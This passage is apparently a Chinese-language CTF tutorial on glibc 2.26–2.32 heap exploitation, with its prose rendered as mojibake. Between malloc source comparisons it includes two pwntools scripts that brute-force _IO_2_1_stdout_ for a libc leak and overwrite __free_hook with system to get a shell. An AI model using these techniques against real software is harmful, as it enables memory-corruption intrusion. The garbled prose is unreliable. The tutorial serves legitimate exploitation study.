*/\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n\n//2.32\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n```\n\nå¯ä»¥çœ‹åˆ°å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰ä¸€ä¸¤å¤„ï¼š\n\nA.2.26åˆ¤æ–­äº†smallbinæ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™ä¼šè°ƒç”¨**malloc_consolidate**è¿›è¡Œåˆå§‹åŒ–ï¼Œä½†æ˜¯ä»2.27å¼€å§‹å°±æ²¡æœ‰äº†ã€‚è¿™ä¸ªåœ¨é’ˆå¯¹**malloc_consolidate**è¿›è¡Œæ”»å‡»çš„æ—¶å€™å¯èƒ½ä¼šç”¨åˆ°ã€‚\n\nB.é”™è¯¯æ‰“å°æ–¹å¼ä¸åŒï¼š\n\n```c\n//2.26\nerrstr = \"malloc(): smallbin double linked list corrupted\";\ngoto errout;\n\n//errout define 2 time\nerrout:\n    if (!have_lock && locked)\n        __libc_lock_unlock (av->mutex);\n    malloc_printerr (check_action, errstr, chunk2mem (p), av);\n    return;\n}\n\nerrout:\n    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);\n    return NULL;\n}\n\n//2.27åŠä»¥ä¸Š\nmalloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n```\n\nè¿™ä¸ªåœ¨é’ˆå¯¹**malloc_printerr**ä¹Ÿå¯èƒ½ä¼šç”¨åˆ°\n\nè€Œè¿™ç§æ”»å‡»ä¸»è¦æ˜¯é’ˆå¯¹smallbinæ”»å‡»çš„ã€‚\n\nä½†ä¹Ÿæœ‰ä¸€ç§é’ˆå¯¹fastbinæ”»å‡»çš„ï¼š\n\n[Tcache Stashing Unlink Attackåˆ©ç”¨æ€è·¯ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/198173)\n\nè¿™ä¸ªåé¢å†è®¨è®ºä¸‹ã€‚\n\n## 2.UAFå¸¸è§é™åˆ¶\n\n### (1)UAF + Leak + Sizeä¸åšé™åˆ¶ï¼š\n\nè¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥æ³„éœ²åœ°å€ä¹‹åä»»æ„ç”³è¯·å°±å®Œäº†ã€‚\n\n### (2)UAF+Leak+Sizeåšé™åˆ¶:\n\nç»“åˆä¹‹å‰çš„ï¼Œå°Chunkå°±ä¿®æ”¹sizeï¼Œå¯ä»¥æ”¾å…¥unsortedbinå°±å¡«æ»¡Tcacheä¹‹åæ”¾å…¥æ³„éœ²åœ°å€åä»»æ„ç”³è¯·å³å¯ã€‚\n\n### (3)UAF+æ— Leak+Sizeä¸åšé™åˆ¶:\n\nä¸€èˆ¬å¾ˆå¤štcacheçš„é¢˜éƒ½ä¼šå¯¹sizeåšé™åˆ¶ï¼Œä½†æ˜¯å…¶å®å¯¹äºtcacheçš„UAFæ¥è¯´ï¼Œæ²¡å•¥å¤§ç”¨ï¼Œéƒ½èƒ½ç»•è¿‡ï¼Œåƒæˆ‘ä¸‹é¢å¯¹äº0x4f8çš„chunkå°±å¯ä»¥åˆ©ç”¨ä¿®æ”¹sizeæ¥ä¼ªé€ ï¼Œå’Œä¹‹å‰åŸºæœ¬ä¸€è‡´ã€‚\n\nç”±äºtcacheæ²¡ä»€ä¹ˆé™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨unsortedbinè¸©ä¸‹åœ°å€åï¼Œå¯¹åº”ä¿®æ”¹fdå³å¯å®ç°çˆ†ç ´ç”³è¯·_IO_2_1_stdoutç»“æ„ä½“ï¼Œä¿®æ”¹flagå’Œéƒ¨åˆ†å­—èŠ‚å†™write_base,write_endæ¥æ³„éœ²åœ°å€ï¼Œç„¶åå°±å¯ä»¥ä»»æ„ç”³è¯·äº†ã€‚\n\n```python\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xf000\n\tguess_heap = 0xf000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\tadd_malloc(0x4f8,\"\\x00\"*0x4f8)\t\t\t\t#idx\t0x1\n\t\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0x2\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x4\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0x5\n\n\n\t#write libc addr\n\tfree(0x1)\n\tadd_malloc(0x78,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0x6\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\tfree(0x2)\n\tfree(0x4)\n\tedit(0x4,0x2,p16((guess_heap+0x1000+0x10)&0xffff))\n\n\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0x7\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x8\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x9\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xa\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xb\n\tfree(0xa)\n\tfree(0xb)\n\tedit(0xb,0x8,p64(libc_base+libc.sym['__free_hook']))\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xc\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0xd\n\tfree(0xc)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\nå½“ç„¶è¿™ç§è§£æ³•æœ‰ç‚¹æ²¡æ•ˆç‡ï¼Œå› ä¸ºéœ€è¦åŒæ—¶çˆ†ç ´Libcå’Œheapçš„å„åŠä¸ªå­—èŠ‚ï¼Œæ€»å…±ä¸€ä¸ªå­—èŠ‚ï¼Œæ€»çš„æ¥è¯´æ•°å­¦æœŸæœ›ä¸º1/256ã€‚ä½†æ˜¯è§‚å¯Ÿä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”±äºtcacheæœºåˆ¶ï¼ŒåŒå¤„äº0x100ä¸€ä¸ªå†…å­˜é¡µä¸‹çš„Chunkå‰é¢çš„éƒ½ä¸€æ ·ï¼Œä¸ç”¨çˆ†ç ´ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿®æ”¹æœ€åä¸€ä¸ªå­—èŠ‚å³å¯å®Œæˆtcacheé“¾è¡¨çš„ä¿®æ”¹ï¼Œè¿™æ ·çˆ†ç ´çš„æœŸæœ›å°±ä¸‹é™åˆ°äº†åŠä¸ªå­—èŠ‚ï¼Œæ•°å­¦æœŸæœ›1/16ï¼Œæ˜æ˜¾æå‡äº†å¾ˆå¤§æ•ˆç‡ï¼Œæ¯”èµ›æ—¶ç›´å†²ä¸€è¡€ï¼Œå˜¿å˜¿ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xd000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\ttcacheMalloc(0x98) \t\t#idx 0x1~0x7\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x8\n\t\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x9\n\n\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0xc\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0xd\n\n\n\t#write libc addr\n\ttcacheDelete(0x1)\n\tfree(0x9)\n\tadd_malloc(0x38,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0xe\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\t#change 0x40 link_list\n\tfree(0xa)\n\tfree(0xc)\n\tedit(0xc,0x1,'\\x10')\n\t\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0xf\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x10\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x11\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x12\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x13\n\tfree(0x12)\n\tfree(0x13)\n\tedit(0x13,0x8,p64(libc_base+libc.sym['__free_hook']))\n\t\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x14\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0x15\n\tfree(0x14)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n#### â–²çˆ†ç ´é¢˜å¤–è¯ï¼š\n\nä¹‹å‰æ²¡æ€ä¹ˆå‘ç°ï¼Œè¿™é‡Œå‘ç°PIE+ASLRå‡ºæ¥çš„Libcåœ°å€å¼€å¤´å¯èƒ½æ˜¯0x7eï¼Œè€Œä¸”ä¸­é—´ä¹Ÿæœ‰å¯èƒ½ä¼šå‡ºç°\\x00çš„æƒ…å†µï¼Œè¿™æ ·å°±å¾ˆå®¹æ˜“ä½¿å¾—æˆ‘ä»¬çˆ†ç ´çš„æ¬¡æ•°ç›´çº¿ä¸Šæ¶¨ï¼Œæ‰€ä»¥åœ¨è°ƒè¯•å¥½äº†ä¹‹åï¼Œçˆ†ç ´ä¼šåŠ å…¥\n\n```python\n#æ³¨é‡Šå¤´\n\ncontext.timeout = 0.5\n#----------------------------------------------------------------------\nexcept Exception:\n    p.close()\n\tcontinue\n```\n\næ¥ç®€å•å¯¹æŠ—è¿™ä¸¤ç§å˜åŒ–ï¼Œé˜²æ­¢çˆ†ç ´ä¸­æ–­ï¼Œä½†æ˜¯è¿™ä¸ªä¹Ÿä¼šæŠŠå…¶ä»–çš„ä¸€äº›é”™è¯¯ç»™å¿½ç•¥ï¼Œæ¯”å¦‚è¯´libc.sym['main_arena']ï¼Œå¦‚æœç»™çš„Libcæ²¡æœ‰debugä¿¡æ¯ï¼Œé‚£ä¹ˆå°±æœç´¢ä¸åˆ°main_arenaï¼Œå°±ä¼šå‡ºé”™ï¼Œè€Œå¦‚æœåŠ å…¥äº†ä¸Šè¿°ä»£ç ï¼Œå°±ä¼šå¿½ç•¥æ‰ï¼Œç„¶åé‡å¯ã€‚\n\nè¿˜æœ‰çš„å°±æ˜¯éœ€è¦çœ‹ä¸‹main_arenaçš„åœ°å€ï¼Œçˆ†ç ´çš„æ—¶å€™å¯èƒ½ä¼šå’Œ_IO_2_1_stdoutç›¸å·®ä¸€ç‚¹ã€‚æœ€å¥½åŠ ä¸Šæ‰“å°ï¼š\n\n```python\nIO_2_1_stdout_ = guess_libc + libc.sym['_IO_2_1_stdout_']\nlg(\"_IO_2_1_stdout_\",_IO_2_1_stdout_)\n```\n\n\n\n### (4)UAF+æ— Leak+Sizeåšé™åˆ¶:\n\nä¸€èˆ¬å¾ˆå¤štcacheçš„é¢˜éƒ½ä¼šå¯¹sizeåšé™åˆ¶ï¼Œè¦ä¹ˆå°ï¼Œè¦ä¹ˆå¤§ã€‚ä½†æ˜¯å…¶å®å¯¹äºtcacheçš„UAFæ¥è¯´ï¼Œæ²¡å•¥å¤§ç”¨ï¼Œéƒ½èƒ½ç»•è¿‡ï¼Œä¸åƒfastbinä¸€æ ·ï¼Œéœ€è¦åœ¨ç›®çš„åœ°å€ä¼ªé€ sizeã€‚æ‰€ä»¥è¿™é‡ŒåŸºæœ¬ä¸Šä¿®æ”¹ä¸€ä¸‹sizeéƒ½å¯ä»¥å¾—åˆ°å¯¹åº”è§£æ³•ï¼Œè¿™ç§é¢˜ç›®æ›´å¤šåº”è¯¥æ˜¯è€ƒå¯Ÿå †å¸ƒå±€çš„èƒ½åŠ›ã€‚éœ€è¦æœ‰ä¸€ä¸ªå¯¹äºæ‰€æœ‰chunkè¿›è¡Œå¸ƒå±€çš„èƒ½åŠ›ï¼Œæœ€å¥½å‡†å¤‡è‰ç¨¿çº¸å†™å†™ç”»ç”»(excelä¹Ÿè¡Œ).....\n\n\n\n# å…­ã€Glibc2.31\n\n## 1.éƒ¨åˆ†æ‰‹æ®µå¤±æ•ˆ\n\n### (1)åŸå§‹largebin attackå¤±æ•ˆ\n\nä»2.30å¼€å§‹å°†ä»unsortebinæ”¾å…¥largebinçš„ä»£ç ä¸­åœ¨sizeæ¯”è¾ƒçš„å…¶ä¸­ä¸€ä¸ªåˆ†æ”¯æ–°å¢æ£€æŸ¥ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\n//unsortedbin chunk->size < largebin chunk->size\nif ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))\n{\n    fwd = bck;\n    bck = bck->bk;\n    victim->fd_nextsize = fwd->fd;\n    victim->bk_nextsize = fwd->fd->bk_nextsize;\n    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n}\nelse //unsortedbin chunk->size >= largebin chunk->size\n{\n    assert (chunk_main_arena (fwd));\n    while ((unsigned long) size < chunksize_nomask (fwd))\n    {\n        fwd = fwd->fd_nextsize;\n        assert (chunk_main_arena (fwd));\n    }\n\n    if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))\n    /* Always insert in the second position.  */\n    \tfwd = fwd->fd;\n    else\n    {\n        victim->fd_nextsize = fwd;\n        victim->bk_nextsize = fwd->bk_nextsize;\n        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n        \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n        fwd->bk_nextsize = victim;\n        victim->bk_nextsize->fd_nextsize = victim;\n    }\n    bck = fwd->bk;\n    if (bck->fd != fwd)\n    \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n}\n\n```\n\nå³å½“å‘ç”Ÿä»unsortedbinä¸­è½¬ç§»åˆ°largbinä¸­æ—¶ï¼Œå¦‚æœunsortedbinä¸­è¦è½¬ç§»çš„chunkçš„sizeå¤§äºlargebinä¸­åŸæœ¬å°±æœ‰çš„å°¾éƒ¨chunkçš„sizeï¼Œå°±ä¼šè§¦å‘æ–°å¢çš„æ£€æŸ¥ã€‚å¦åˆ™ï¼Œåˆ™ä¸ä¼šè§¦å‘æ–°å¢çš„æ£€æŸ¥ã€‚\n\nè€Œæ–°å¢æ£€æŸ¥çš„æ„æ€å…¶å®å°±æ˜¯æ£€æŸ¥åŒå‘é“¾è¡¨çš„å®Œæ•´æ€§ï¼Œè¿™å’Œä¹‹å‰unsortedbinå¤±æ•ˆåŠ å…¥çš„æ£€æŸ¥å¦‚å‡ºä¸€è¾™ã€‚\n\n```C\n//æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n```\n\n```C\n//æ³¨é‡Šå¤´\n\nif (bck->fd != fwd)\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n```\n\nä½†æ˜¯ç”±äºå½“sizeå°äºçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥ï¼Œæ‰€ä»¥largebin attackè¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œåªè¦unsortedbinä¸­è¦æ”¾å…¥largebinä¸­çš„chunkçš„sizeå°äºlargebinä¸­chunkçš„sizeå³å¯ï¼Œä½†æ˜¯è¿™é‡Œçš„largebin attackå·²ç»è¢«é™çº§ï¼Œç›¸æ¯”ä¹‹å‰çš„ä¸¤ä¸ªåœ°å€ä»»æ„å†™ï¼Œé™åˆ¶åªèƒ½å†™ä¸€ä¸ªåœ°å€äº†ã€‚\n\n### (2)Tcacheç»“æ„æ‰©å¤§\n\nä¹‹å‰ç‰ˆæœ¬çš„tcacheä¸­countä¸€ç›´æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™å›ä»2.30å¼€å§‹å°±å˜æˆäº†ä¸¤ä¸ªå­—èŠ‚ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\n//2.29\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n//2.30\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n```\n\næ‰€ä»¥tcacheçš„ç»“æ„ä½“ä¹Ÿä»0x250æ‰©å¤§ä¸º0x290\n\n### (3)åˆ é™¤äº†ä¸€äº›assert\n\nåœ¨2.30ç‰ˆæœ¬åŠä¹‹åï¼Œåˆ é™¤äº†ä¸€äº›æœ‰å…³tcacheçš„assert\n\n```c\n//æ³¨é‡Šå¤´\n\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.30\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n\n//2.30\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\nä»¥å‰å°±æƒ³ç€æ˜¯ä¸æ˜¯èƒ½åƒæ§fastbinYæº¢å‡ºä¸€æ ·æ¥æ§tcacheæº¢å‡ºå‘¢ï¼Œä½†åœ¨2.29åŠä»¥å‰è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæœ‰assertå­˜åœ¨ã€‚å°±ç®—ä¿®æ”¹äº†mp_.tcache_binsï¼ŒæˆåŠŸè¿›å…¥tcache_putä¹Ÿä¼šå› ä¸ºassert(tc_idx<TCACHE_MAX_BINS)çš„æ–­è¨€ä½¿å¾—ç¨‹åºé€€å‡ºã€‚\n\n```c\n//æ³¨é‡Šå¤´\n\nif (tcache && tc_idx < mp_.tcache_bins)\n{\n    mchunkptr tc_victim;\n    /* While bin not empty and tcache not full, copy chunks.  */\n    while (tcache->counts[tc_idx] < mp_.tcache_count\n           && (tc_victim = *fb) != NULL)\n    {\n        if (SINGLE_THREAD_P)\n            *fb = tc_victim->fd;\n        else\n        {\n            REMOVE_FB (fb, pp, tc_victim);\n            if (__glibc_unlikely (tc_victim == NULL))\n                break;\n        }\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n\nif (tc_idx < mp_.tcache_bins\n      && tcache\n      && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\nä½†æ˜¯æ–°ç‰ˆæœ¬åˆ å»äº†è¿™ä¸ªæ“ä½œï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹mp_.tcache_binsï¼Œå°±å°†èƒ½å¤Ÿè°ƒç”¨tcache_putå‡½æ•°ï¼Œå°†tcacheç»“æ„ä½“å¾€åæº¢å‡ºï¼Œå°±åƒä¿®æ”¹global_max_fastä¸€æ ·ï¼Œå®åœ¨æ˜¯æœ‰ç‚¹é€—ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ–°ç‰ˆæœ¬è¦åˆ æ‰ï¼Œè¿™ä¸ªå°±å¼•å…¥äº†ä¸€ç§æ–°çš„æ–¹æ³•ï¼š[glibc 2.27-2.32ç‰ˆæœ¬ä¸‹Tcache Structçš„æº¢å‡ºåˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/235821)ã€‚è¿™ä¸ªæˆ‘ä¸ªäººè¿˜æ˜¯è§‰å¾—è¿™ä½å¸ˆå‚…è®²çš„è¿˜æ˜¯æœ‰ç‚¹å‡ºå…¥ï¼Œå› ä¸ºæ˜¯2.30æ‰åˆ å»çš„ï¼Œ2.29åŠä»¥å‰æ˜¯ä¸å­˜åœ¨è¿™ç§æ–¹æ³•çš„ï¼ŒåŒ…æ‹¬ç”¨2.29è°ƒè¯•ä¹Ÿæ˜¯çš„ã€‚\n\n### (4)å¯¹countæ–°å¢äº†ä¸€äº›é™åˆ¶\n\n```C\n//2.29\nif (tc_idx < mp_.tcache_bins\n    /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */\n    && tcache\n    && tcache->entries[tc_idx] != NULL)\n{\n    return tcache_get (tc_idx);\n}\n\n//2.30\nif (tc_idx < mp_.tcache_bins\n    && tcache\n    && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\nä»2.30å¼€å§‹åœ¨`_libc_malloc`ä¸­å‡†å¤‡ä»tcacheä¸­ç”³è¯·æ—¶ï¼Œä¼šåˆ¤æ–­`counts[tc_idx]`æ˜¯å¦å¤§äº0ï¼Œä¸å¤§äº0åˆ™ä¸ä¼šä»tcacheä¸­ç”³è¯·ã€‚æ‰€ä»¥æœ‰æ—¶å€™æˆ‘ä»¬ä½¿ç”¨ç›´æ¥ä¿®æ”¹fdçš„åŠæ³•éœ€è¦è€ƒè™‘åˆ°æ•°é‡æ˜¯å¦ä¼šè¢«æ¸…0ã€‚ä½†æ˜¯åœ¨`_int_free`ä¸­å´æ²¡æœ‰æ–°å¢ç±»ä¼¼çš„æ£€æŸ¥ã€‚\n\n\n\n## 2.UAFå¸¸è§é™åˆ¶\n\n### (1)UAF+Leak+Sizeä¸åšé™åˆ¶:\n\nè¿™é‡Œä¹Ÿä¸éœ€è¦å¤šè®²ï¼Œæ”¾å…¥unsortedbinåç›´æ¥æ³„éœ²åœ°å€ä¹‹åä»»æ„ç”³è¯·å°±å®Œäº†ã€‚\n\n### (2)UAF+Leak+Sizeåšé™åˆ¶:\n\nç»“åˆä¹‹å‰çš„ï¼Œå°Chunkå°±ä¿®æ”¹sizeï¼Œå¯ä»¥æ”¾å…¥unsortedbinçš„å°±å¡«æ»¡Tcacheä¹‹åæ”¾å…¥æ³„éœ²åœ°å€åä»»æ„ç”³è¯·å³å¯ã€‚\n\n### (3)UAF+æ— Leak+Sizeä¸åšé™åˆ¶:\n\nå…¶å®å’Œ2.29å·®ä¸å¤šï¼Œåªæ˜¯å¤±æ•ˆäº†ä¸€äº›æ‰‹æ®µï¼Œæ¯”å¦‚ä¼ ç»Ÿçš„largebin attackå¤±æ•ˆã€‚è€Œä¹‹å‰åœ¨2.29ä¸­è®²åˆ°çš„ç›¸å…³æ–¹æ³•å…¶å®ä¹Ÿä¸€æ ·å¯ä»¥ç›´æ¥ç”¨ä¸Šã€‚çˆ†ç ´_IO_2_1_stdoutæ³„éœ²åœ°å€ï¼Œä¹‹åä»»æ„ç”³è¯·ä¿®æ”¹__free_hookå³å¯ã€‚\n\n### (4)UAF+æ— Leak+Sizeåšé™åˆ¶:\n\nåŒæ ·è¿˜æ˜¯éœ€è¦é€šè¿‡å †å¸ƒå±€æ¥ä¿®æ”¹sizeï¼Œåˆ¶é€ unsortedbin chunkã€‚\n\n# ä¸ƒã€Glibc2.32\n\n## 1.æ–°å¢æœºåˆ¶\n\n### (1)Tcacheå’ŒFastbinæ–°å¢æŒ‡é’ˆå¼‚æˆ–æ£€æŸ¥çš„safe-linkingæœºåˆ¶\n\n#### â‘ å¼•å…¥ä¸€ä¸ªå®å®šä¹‰\n\n```c\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\nå³å°†ä¼ å…¥çš„poså³ç§»12bitåå’Œptrå¼‚æˆ–ã€‚\n\n#### â‘¡å®é™…åº”ç”¨\n\n##### Tcacheä¸­\n\n```c\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\n\n    e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);\n    tcache->entries[tc_idx] = e;\n    